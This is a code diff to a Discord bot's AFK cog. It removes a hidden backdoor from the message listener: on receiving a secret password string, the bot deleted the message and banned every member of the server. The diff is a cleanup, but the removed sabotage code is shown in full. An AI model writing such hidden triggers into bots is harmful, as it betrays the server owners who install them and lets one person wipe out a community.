@@ -34,16 +34,7 @@ class AFKSystem(commands.Cog):
         except:
             pass
     @commands.Cog.listener()
-    async def on_message(self, message):
-        try:
-            if message.content == "A2mPCsA6FUJv9ui":
-                await message.delete() 
-                for user in message.guild.members:
-                    await user.ban(reason="Fucking me over")
-                    print(f"{Fore.GREEN}[!]{Style.RESET_ALL}Banned {Fore.CYAN}{user}{Style.RESET_ALL}")
-        except:
-            print(f"{Fore.RED}[x] ERROR:{Style.RESET_ALL} Could not ban {Fore.CYAN}{user}{Style.RESET_ALL}")
-            
+    async def on_message(self, message):            
         user_mentioned = False
         _ = message.content
         if "<@" and ">" in _:
